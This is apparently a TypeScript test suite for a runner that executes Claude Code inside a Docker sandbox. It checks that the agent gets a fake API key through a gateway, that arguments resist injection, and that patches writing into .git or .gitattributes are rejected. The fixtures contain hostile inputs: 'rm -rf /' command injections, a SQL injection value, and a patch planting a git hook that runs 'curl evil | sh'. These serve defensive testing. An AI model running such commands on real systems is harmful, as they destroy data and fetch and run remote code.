// 046.3 · 执行器在沙箱里跑：计划（假 key、网关、白名单）、一次运行的来回（假容器）、补丁套到宿主（真 git）、运行记录的 sandbox 字段。
import { after, before, beforeEach, describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync, chmodSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
// @ts-ignore 纯 JS 模块
import { FAKE_KEY, agentArgv, applySandboxPatch, flagLine, runInSandbox, sandboxPlan } from '../scripts/lib/sandbox/run.mjs';

process.env.WB_DB = ':memory:';
const roots: string[] = [];
after(() => { for (const r of roots) rmSync(r, { recursive: true, force: true }); });
const tmp = (p: string) => { const d = mkdtempSync(join(tmpdir(), p)); roots.push(d); return d; };

const REAL = 'test-token-not-real-SECRET-123456';
const claudeBackend = (env: any) => ({ name: 'pool', tool: 'claude', model: 'deepseek-v4', env });

describe('046.3 · sandboxPlan', () => {
  test('Claude Code + API Key：真 key 只给网关，agent 拿假 key、基址指向网关', () => {
    const p = sandboxPlan(claudeBackend({ ANTHROPIC_BASE_URL: 'https://api.deepseek.com/anthropic/', ANTHROPIC_AUTH_TOKEN: REAL }), {}, 9);
    assert.equal(p.ok, true);
    assert.deepEqual(p.gateway, { upstream: 'https://api.deepseek.com/anthropic', preset: 'anthropic', auth: 'bearer', key: REAL });
    assert.equal(p.env.ANTHROPIC_BASE_URL, 'http://wb-gateway:8080');
    assert.equal(p.env.ANTHROPIC_AUTH_TOKEN, FAKE_KEY);
    assert.equal(p.env.ANTHROPIC_MODEL, 'deepseek-v4');
    assert.equal(p.env.WB_TASK_ID, '9');
    assert.ok(!JSON.stringify(p.env).includes(REAL), 'agent 的环境变量里没有真 key');
    assert.ok(!JSON.stringify(p.egress).includes('deepseek'), '模型接口走网关，代理白名单里不用放它');
  });

  test('x-api-key 后端照原样；本机上游（反代池）改成 host.docker.internal，只有网关连得到', () => {
    const p = sandboxPlan(claudeBackend({ ANTHROPIC_BASE_URL: 'http://127.0.0.1:1455', ANTHROPIC_API_KEY: REAL }), { sandboxAllow: ['github.com'] }, 1);
    assert.equal(p.gateway.auth, 'x-api-key');
    assert.equal(p.gateway.upstream, 'http://host.docker.internal:1455');
    assert.equal(p.env.ANTHROPIC_API_KEY, FAKE_KEY);
    assert.ok(!('ANTHROPIC_AUTH_TOKEN' in p.env));
    assert.deepEqual(p.egress.allow, ['registry.npmjs.org', 'pypi.org', 'files.pythonhosted.org', 'github.com']);
    assert.equal(sandboxPlan(claudeBackend({ ANTHROPIC_BASE_URL: 'http://localhost:1455/v1', ANTHROPIC_API_KEY: 'k' })).gateway.upstream, 'http://host.docker.internal:1455/v1');
  });

  test('还不支持的：dsh、codebuddy、订阅登录（没有 key）、基址不合法——都说清楚，不悄悄放行', () => {
    for (const [b, re] of [
      [{ tool: 'dsh', env: {} }, /只支持 Claude Code/],
      [{ tool: 'codebuddy', env: {} }, /只支持 Claude Code/],
      [claudeBackend({}), /API Key/],
      [claudeBackend({ ANTHROPIC_BASE_URL: 'https://x.com' }), /API Key/],
      [claudeBackend({ ANTHROPIC_BASE_URL: 'not a url', ANTHROPIC_API_KEY: 'k' }), /不是合法地址/],
    ] as [any, RegExp][]) {
      const p = sandboxPlan(b);
      assert.equal(p.ok, false);
      assert.match(p.why, re);
    }
  });

  test('沙箱里的 Claude Code 权限全开（墙是容器），提示词是一个独立参数', () => {
    const a = agentArgv('改 README；$(rm -rf /)');
    assert.equal(a[0], 'claude');
    assert.equal(a[2], '改 README；$(rm -rf /)');
    assert.ok(a.includes('--dangerously-skip-permissions') && a.includes('stream-json'));
  });
});

// ───────────── 一次运行的来回（假容器） ─────────────

function fakeProvider(opts: { setupCode?: number; agentCode?: number; harvestCode?: number; patch?: string; createThrows?: boolean; agentLines?: string[] } = {}) {
  const calls: any[] = [];
  let destroyed = 0;
  const provider = {
    async create(o: any) {
      calls.push(['create', o]);
      if (opts.createThrows) throw new Error('docker 起不来');
      return {
        async copyIn(h: string, b: string) { calls.push(['copyIn', h, b, existsSync(h)]); },
        async exec(argv: string[], o2: any) {
          calls.push(['exec', argv, o2.cwd, o2.timeoutMs]);
          if (argv[0] === 'claude') { for (const l of opts.agentLines ?? []) o2.onLine(l); return { code: opts.agentCode ?? 0, timedOut: false }; }
          if (argv[2]?.includes('git clone')) return { code: opts.setupCode ?? 0 };
          return { code: opts.harvestCode ?? 0 };
        },
        async copyOut(_b: string, dir: string) { const f = join(dir, 'out.patch'); writeFileSync(f, opts.patch ?? ''); calls.push(['copyOut', dir]); return f; },
        async destroy() { destroyed++; calls.push(['destroy']); },
      };
    },
  };
  return { provider, calls, destroyed: () => destroyed };
}
const plan = sandboxPlan(claudeBackend({ ANTHROPIC_BASE_URL: 'https://api.deepseek.com/anthropic', ANTHROPIC_AUTH_TOKEN: REAL }), {}, 5);

describe('046.3 · runInSandbox（假容器）', () => {
  const base = (f: any, extra: any = {}) => {
    const gits: string[][] = [];
    return {
      gits,
      o: { provider: f.provider, task: { id: 5, title: '改 README\n"; rm -rf /' }, project: '/p', branch: 'wb/T-5', plan, prompt: '做事', timeoutMs: 1000, onLine: () => {}, gitRun: (cwd: string, ...a: string[]) => { gits.push([cwd, ...a]); writeFileSync(a.at(-2)!, 'bundle'); return ''; }, tmpRoot: tmp('wb-t-'), ...extra },
    };
  };

  test('顺序：宿主打 bundle → 起沙箱 → 拷进去 → 克隆 → 跑 Claude Code → 收补丁 → 拷出来 → 销毁', async () => {
    const lines: string[] = [];
    const f = fakeProvider({ patch: 'diff --git a/x b/x\n', agentLines: ['{"type":"result"}', 'raw'] });
    const { o, gits } = base(f, { onLine: (l: string) => lines.push(l) });
    const r = await runInSandbox(o);
    assert.equal(r.problem, '');
    assert.equal(String(r.patch), 'diff --git a/x b/x\n'); // 062：成功时是原样字节（Buffer）
    assert.deepEqual(gits[0].slice(0, 3), ['/p', 'bundle', 'create']);
    assert.equal(gits[0].at(-1), 'main');
    assert.deepEqual(f.calls.map((c) => c[0]), ['create', 'copyIn', 'exec', 'exec', 'exec', 'copyOut', 'destroy']);
    const created = f.calls[0][1];
    assert.equal(created.gateway.key, REAL, '真 key 只交给供应商去写进网关');
    assert.ok(!JSON.stringify(created.env).includes(REAL));
    assert.equal(f.calls[1][2], '/work/repo.bundle');
    assert.equal(f.calls[1][3], true, '拷进去的时候 bundle 真的在');
    const setup = f.calls[2][1];
    assert.equal(setup[0], 'sh');
    assert.ok(!setup[2].includes('wb/T-5'), '分支名当位置参数传，不拼进脚本');
    assert.equal(setup[4], 'wb/T-5');
    assert.equal(f.calls[3][1][0], 'claude');
    assert.equal(f.calls[3][2], '/work/repo');
    assert.equal(f.calls[3][3], 1000);
    const harvest = f.calls[4][1];
    assert.ok(!harvest[2].includes('rm -rf'), '任务标题当位置参数传，不拼进脚本');
    assert.ok(!harvest[3].includes('\n'), '提交信息里的换行已经去掉');
    assert.deepEqual(lines, ['{"type":"result"}', 'raw']);
    assert.equal(f.destroyed(), 1);
    assert.equal(readdirSync(o.tmpRoot).length, 0, '宿主上的临时目录清掉了');
  });

  test('出错也销毁：克隆失败、收补丁失败、起不来；分支名不对连 Docker 都不碰', async () => {
    for (const [opts, re] of [[{ setupCode: 1 }, /克隆代码失败/], [{ harvestCode: 1 }, /取改动失败/], [{ createThrows: true }, /docker 起不来/]] as [any, RegExp][]) {
      const f = fakeProvider(opts);
      const r = await runInSandbox(base(f).o);
      assert.match(r.problem, re);
      assert.equal(f.destroyed(), opts.createThrows ? 0 : 1);
    }
    const f = fakeProvider();
    const r = await runInSandbox(base(f, { branch: 'main; rm -rf /' }).o);
    assert.match(r.problem, /分支名不对/);
    assert.equal(f.calls.length, 0);
  });
});

// ───────────── 补丁套到宿主（真 git） ─────────────

const g = (cwd: string, ...a: string[]) => {
  const r = spawnSync('git', a, { cwd, encoding: 'utf8' });
  if (r.status !== 0) throw new Error(`git ${a.join(' ')} 失败：${r.stderr}`);
  return (r.stdout || '').trim();
};
function repo() {
  const d = tmp('wb-repo-');
  g(d, 'init', '-q', '-b', 'main');
  // Windows 的全局 core.autocrlf=true 会在 git add 时把 CRLF 改成 LF，CRLF 用例就测不到了；沙箱容器里没有这个设置。
  g(d, 'config', 'core.autocrlf', 'false');
  g(d, 'config', 'user.name', 't'); g(d, 'config', 'user.email', 't@example.com'); g(d, 'config', 'commit.gpgsign', 'false');
  writeFileSync(join(d, 'README.md'), 'hello\n');
  writeFileSync(join(d, 'package.json'), '{"name":"x"}\n');
  g(d, 'add', '-A'); g(d, 'commit', '-qm', 'init');
  return d;
}
/** 在另一个克隆里改，按沙箱里的同一句命令出补丁。 */
function patchFrom(src: string, change: (d: string) => void) {
  const d = tmp('wb-sbxclone-');
  rmSync(d, { recursive: true, force: true });
  g(tmpdir(), 'clone', '-q', '-c', 'core.autocrlf=false', '--branch', 'main', src, d);
  g(d, 'config', 'user.name', 'wb-sandbox'); g(d, 'config', 'user.email', 'sandbox@localhost'); g(d, 'config', 'commit.gpgsign', 'false');
  g(d, 'checkout', '-q', '-b', 'wb/T-5');
  change(d);
  g(d, 'add', '-A');
  g(d, 'commit', '-qm', 'T-5 x');
  // 不能 trim：最后一行的 \r 会被吃掉（沙箱里是直接重定向进文件，不经过 trim）。
  return spawnSync('git', ['diff', '--binary', '--full-index', 'main..HEAD'], { cwd: d, encoding: 'utf8' }).stdout;
}
const trapHooks = (d: string) => {
  const marker = join(d, '..', `hook-ran-${Math.random().toString(36).slice(2)}`);
  for (const h of ['pre-commit', 'post-commit', 'commit-msg', 'pre-applypatch', 'post-applypatch']) {
    const f = join(d, '.git', 'hooks', h);
    writeFileSync(f, `#!/bin/sh\necho ran > "${marker}"\n`);
    try { chmodSync(f, 0o755); } catch { /* Windows */ }
  }
  return marker;
};

describe('046.3 · applySandboxPatch（真 git）', { skip: spawnSync('git', ['--version']).status !== 0 ? '没有 git' : false }, () => {
  test('正常补丁：过检查、套用、提交；宿主上的钩子一个都没跑；改了 package.json 带标记', () => {
    const host = repo();
    const patch = patchFrom(host, (d) => {
      writeFileSync(join(d, 'README.md'), 'hello sandbox\n');
      mkdirSync(join(d, 'src'));
      writeFileSync(join(d, 'src', '中文 文件.ts'), 'export const a = 1;\r\n');
      writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"postinstall":"evil"}}\n');
      writeFileSync(join(d, 'logo.bin'), Buffer.from([0, 1, 2, 255, 254, 0, 10]));
    });
    const marker = trapHooks(host);
    const before = g(host, 'rev-parse', 'HEAD');
    const r = applySandboxPatch({ dir: host, patch, taskId: 5, gitRun: g, rejectsDir: tmp('wb-rej-'), tmpRoot: tmp('wb-ap-') });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.notEqual(g(host, 'rev-parse', 'HEAD'), before);
    assert.equal(readFileSync(join(host, 'README.md'), 'utf8'), 'hello sandbox\n');
    assert.equal(readFileSync(join(host, 'src', '中文 文件.ts'), 'utf8'), 'export const a = 1;\r\n', 'CRLF 原样保留');
    assert.deepEqual([...readFileSync(join(host, 'logo.bin'))], [0, 1, 2, 255, 254, 0, 10], '二进制原样');
    assert.equal(existsSync(marker), false, '宿主上的 git 钩子没有被触发');
    assert.deepEqual(r.flags.map((f: any) => f.code), ['package-json']);
    assert.match(flagLine(r.flags), /⚠ 要人看：改了 package\.json/);
    assert.equal(g(host, 'status', '--porcelain'), '', '套完工作区是干净的');
  });

  for (const kind of ['smudge', 'process']) {
    test(`046 C17 · 套用补丁不会运行宿主的 Git ${kind} 过滤器`, () => {
      const host = repo();
      writeFileSync(join(host, '.gitattributes'), 'README.md filter=probe.fixture\n');
      g(host, 'add', '.gitattributes');
      g(host, 'commit', '-qm', 'existing attributes');
      const patch = patchFrom(host, (d) => writeFileSync(join(d, 'README.md'), 'sandbox edit\n'));
      const marker = join(host, 'filter-ran');
      g(host, 'config', `filter.probe.fixture.${kind}`, 'echo invoked > filter-ran');
      const result = applySandboxPatch({ dir: host, patch, taskId: 5, gitRun: g, rejectsDir: tmp('wb-rej-') });
      assert.equal(existsSync(marker), false, '审批前不得运行宿主过滤器');
      assert.equal(result.ok, true, JSON.stringify(result));
      assert.match(g(host, 'show', 'HEAD:README.md'), /sandbox edit/);
      assert.equal(g(host, 'config', `filter.probe.fixture.${kind}`), 'echo invoked > filter-ran');
    });
  }

  test('046 C17 · 拒收后任务工作树与 main 都没有属性文件，合并不运行外部程序', () => {
    const main = repo();
    const work = join(tmp('wb-wt-'), 'task');
    const patch = patchFrom(main, (d) => {
      mkdirSync(join(d, 'docs'));
      writeFileSync(join(d, 'docs', '.gitattributes'), '*.md filter=probe diff=probe merge=probe\n');
      writeFileSync(join(d, 'docs', 'new.md'), 'sandbox edit\n');
    });
    for (const key of ['filter.probe.smudge', 'diff.probe.textconv', 'merge.probe.driver']) {
      g(main, 'config', key, 'echo invoked > external-ran');
    }
    g(main, 'worktree', 'add', '-b', 'c17-task', work, 'main');
    try {
      const initial = g(main, 'rev-parse', 'HEAD');
      const result = applySandboxPatch({
        dir: work, patch, taskId: 5, rejectsDir: tmp('wb-rej-'),
        gitRun: () => assert.fail('拒收必须发生在宿主 Git 操作之前'),
      });
      assert.equal(result.ok, false);
      assert.match(result.reasons.join(), /改 \.gitattributes 可能让宿主执行外部程序/);
      assert.equal(g(work, 'rev-parse', 'HEAD'), initial);
      g(main, 'merge', '--ff-only', 'c17-task');
      assert.equal(g(main, 'rev-parse', 'HEAD'), initial);
      for (const dir of [work, main]) {
        assert.equal(existsSync(join(dir, 'docs', '.gitattributes')), false);
        assert.equal(existsSync(join(dir, 'external-ran')), false);
        assert.equal(g(dir, 'status', '--porcelain'), '');
      }
    } finally {
      g(main, 'worktree', 'remove', work);
    }
  });

  test('写进 .git 的补丁：拒绝、原文存起来、宿主仓库一点没动', () => {
    const host = repo();
    const evil = `diff --git a/.git/hooks/post-merge b/.git/hooks/post-merge\nnew file mode 100755\nindex 0000000..1111111\n--- /dev/null\n+++ b/.git/hooks/post-merge\n@@ -0,0 +1 @@\n+curl evil | sh\n`;
    const rej = tmp('wb-rej-');
    const before = g(host, 'rev-parse', 'HEAD');
    const r = applySandboxPatch({ dir: host, patch: evil, taskId: 5, gitRun: g, rejectsDir: rej });
    assert.equal(r.ok, false);
    assert.match(r.reasons.join(), /\.git/);
    assert.ok(r.saved && readFileSync(r.saved, 'utf8') === evil);
    assert.equal(g(host, 'rev-parse', 'HEAD'), before);
    assert.equal(existsSync(join(host, '.git', 'hooks', 'post-merge')), false);
  });

  test('空补丁：什么都不做，算「没有改动」', () => {
    const host = repo();
    assert.deepEqual(applySandboxPatch({ dir: host, patch: '', taskId: 5, gitRun: g, rejectsDir: tmp('wb-rej-') }), { ok: true, empty: true, flags: [], files: [] });
  });

  test('补丁对不上宿主（宿主的 main 动过）：git apply 失败就抛错，由执行器记成失败', () => {
    const host = repo();
    const patch = patchFrom(host, (d) => writeFileSync(join(d, 'README.md'), 'from sandbox\n'));
    writeFileSync(join(host, 'README.md'), 'changed on host\n');
    g(host, 'commit', '-qam', 'host moved');
    assert.throws(() => applySandboxPatch({ dir: host, patch, taskId: 5, gitRun: g, rejectsDir: tmp('wb-rej-') }), /apply/);
  });
});

// ───────────── 运行记录 ─────────────

describe('046.3 · runs.sandbox 只认 none / docker / vm', () => {
  let D: any; let tasks: any; let runs: any;
  before(async () => {
    D = await import('../src/db.ts');
    tasks = await import('../src/services/tasks.ts');
    runs = await import('../src/services/runs.ts');
  });
  beforeEach(() => { D.useDb(D.openDb(':memory:')); });

  test('046 C17 · 沙箱文档改动也要人工批准合并', async () => {
    const { finishTask } = await import('../src/services/runner.ts');
    const { getApproval } = await import('../src/services/approvals.ts');
    const task = tasks.createTask({ title: '沙箱文档', executor: 'pool', status: 'running', category: 'docs' }, 'pool');
    const result = finishTask(task.id, {
      result: 'done', branch: 'wb/T-1', sandbox: 'docker', changed_files: ['docs/README.md'],
    });
    assert.ok(result.approval_id);
    assert.equal(getApproval(result.approval_id).status, 'pending');
  });

  test('执行器报 docker 就记 docker；乱写的值记 none；不报就保持原样', () => {
    const t = tasks.createTask({ title: 's', executor: 'pool', status: 'running', category: 'dev' }, 'pool');
    runs.openRun(t.id, 'pool', '');
    assert.equal(runs.closeRun(t.id, 'done', { sandbox: 'docker' }).sandbox, 'docker');
    runs.openRun(t.id, 'pool', '');
    assert.equal(runs.closeRun(t.id, 'done', { sandbox: 'docker; DROP TABLE runs' }).sandbox, 'none');
    runs.openRun(t.id, 'pool', '');
    assert.equal(runs.closeRun(t.id, 'failed', {}).sandbox, 'none');
  });
});

describe('046.3 · 执行器接线', () => {
  const src = readFileSync(new URL('../scripts/runner.mjs', import.meta.url), 'utf8');
  test('进不去沙箱就失败，不退回宿主；沙箱里不换后端重跑；回报里带 sandbox；启动时扫残留', () => {
    assert.match(src, /不会退回宿主上跑/);
    assert.match(src, /if \(!sandbox && run\.code !== 0/);
    assert.match(src, /sandbox: sandboxMode,/);
    assert.match(src, /sweepOrphans\(\[\]\)/);
    assert.match(src, /applySandboxPatch\(/);
  });
});

describe('046 真机复测 · Windows 换行设置下套补丁', { skip: spawnSync('git', ['--version']).status !== 0 ? '没有 git' : false }, () => {
  test('宿主仓库开着 core.autocrlf=true（Windows 默认）、文件按 CRLF 检出：补丁照样套得上，提交进去的是原样内容，工作区干净', () => {
    const host = repo();
    g(host, 'config', 'core.autocrlf', 'true');
    rmSync(join(host, 'README.md'));
    g(host, 'checkout', '--', 'README.md');
    assert.equal(readFileSync(join(host, 'README.md'), 'utf8'), 'hello\r\n', '前提：宿主上 README 是按 CRLF 检出的');
    const patch = patchFrom(host, (d) => writeFileSync(join(d, 'README.md'), 'hello\nfrom sandbox\n'));
    const r = applySandboxPatch({ dir: host, patch, taskId: 56, gitRun: g, rejectsDir: tmp('wb-rej-'), tmpRoot: tmp('wb-ap-') });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(g(host, 'show', 'HEAD:README.md'), 'hello\nfrom sandbox', '提交里是补丁的原样内容');
    assert.equal(readFileSync(join(host, 'README.md'), 'utf8'), 'hello\r\nfrom sandbox\r\n', '工作区按宿主的换行设置重新检出');
    assert.equal(g(host, 'status', '--porcelain'), '');
  });
});

describe('046 收尾 · 沙箱按执行者开关', () => {
  test('执行者自己写了就听它的，没写看全局；只认 docker', async () => {
    // @ts-ignore
    const { sandboxModeFor, anySandbox } = await import('../scripts/lib/sandbox/run.mjs');
    const cfg = { sandbox: 'docker', executors: { pool: {}, workbuddy: { sandbox: 'none' }, dsh: { sandbox: 'off' } } };
    assert.equal(sandboxModeFor(cfg, 'pool'), 'docker', '没写，跟全局');
    assert.equal(sandboxModeFor(cfg, 'workbuddy'), 'none', '自己写了 none，全局开着也不进');
    assert.equal(sandboxModeFor(cfg, 'dsh'), 'none', '不认识的值当 none');
    assert.equal(sandboxModeFor(cfg, 'nope'), 'docker');
    const only = { executors: { pool: { sandbox: 'docker' }, claude: {} } };
    assert.equal(sandboxModeFor(only, 'pool'), 'docker', '全局不开，只给一个开');
    assert.equal(sandboxModeFor(only, 'claude'), 'none');
    assert.equal(anySandbox(only), true);
    assert.equal(anySandbox({ executors: { a: {} } }), false);
    assert.equal(anySandbox(cfg), true);
  });

  test('执行器按执行者取沙箱模式，启动扫残留看的是「有没有任何一个用沙箱」', () => {
    const src = readFileSync(new URL('../scripts/runner.mjs', import.meta.url), 'utf8');
    assert.match(src, /const sandboxMode = sandboxModeFor\(cfg, task\.executor\)/);
    assert.match(src, /if \(anySandbox\(cfg\)\)/);
    assert.ok(!/cfg\.sandbox === 'docker'/.test(src), '不再只看全局开关');
  });
});
